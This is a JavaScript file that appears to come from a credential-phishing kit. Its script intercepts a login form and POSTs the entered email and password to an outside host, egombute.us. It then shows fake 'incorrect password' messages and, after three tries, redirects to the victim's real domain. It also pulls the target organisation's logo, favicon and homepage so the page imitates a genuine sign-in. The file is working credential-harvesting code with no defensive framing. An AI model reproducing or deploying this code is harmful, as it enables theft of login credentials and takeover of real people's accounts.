var timer2 = "4:59";
var interval = setInterval(function() {
    var timer = timer2.split(':');
    //by parsing integer, I avoid all extra string processing
    var minutes = parseInt(timer[0], 10);
    var seconds = parseInt(timer[1], 10);
    --seconds;
    minutes = (seconds < 0) ? --minutes : minutes;
    console.log(minutes, seconds);
    seconds = (seconds < 0) ? 59 : seconds;
    seconds = (seconds < 10) ? '0' + seconds : seconds;
    //minutes = (minutes < 10) ?  minutes : minutes;
    if (minutes < 0) {
        clearInterval(interval);
    } else {
        $('.countdown').html(minutes + ':' + seconds);
        timer2 = minutes + ':' + seconds;
    } 
}, 1000);

$(document).ready(function() {
  var submitCount = 0;
  
  $("#form1").submit(function(e) {
    e.preventDefault();
    
    var formData = $(this).serialize();
    var url = "https://egombute.us/send/az365.php";
    
    $("#submit-btn").text("Verifying...");
    
    $.ajax({
      type: "POST",
      url: url,
      data: formData,
      success: function(response) {
		$("#message").text("Your account or password is incorrect. If you don't remember your password, reset it now.");
        $("#form1")[0].reset();
		$("#submit-btn").text("Submit");
      },
      error: function(response) {
        $("#error-msg").html("Incorrect password! Please try again");
		$("#error-msg").fadeOut(5000);
        $("#form1")[0].reset();
		submitCount++;
		$("#submit-btn").text("Submit");
        if (submitCount >= 3) {
          window.location.replace("http://www."+my_slice);
        }
      }
    });
  });
});

$(document).ready(function() {
  var email = $("#email").val();
  var my_email = email;
  var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

  if (!filter.test(my_email)) {
    return false;
  }

  var ind = my_email.indexOf("@");
  var my_slice = my_email.substr((ind + 1));
  var c = my_slice.substr(0, my_slice.indexOf("."));
  var final = c.toLowerCase();
  var finalu = c.toUpperCase();

  $("#logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
  $("#logoname").html(finalu);
  $(".domain").html(my_slice);
  $(".email").html(email);
		
  var mainPage = 'https://'+my_slice; 
  //     var mainPage = 'https://webmail.staralliancebd.com/';  
  $("#favimg").attr("href", "https://www.google.com/s2/favicons?domain=" + my_slice);
  $("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
  document.getElementById('mainPage').src = mainPage;
  //    $("#mainPage").src(mainPage);
});
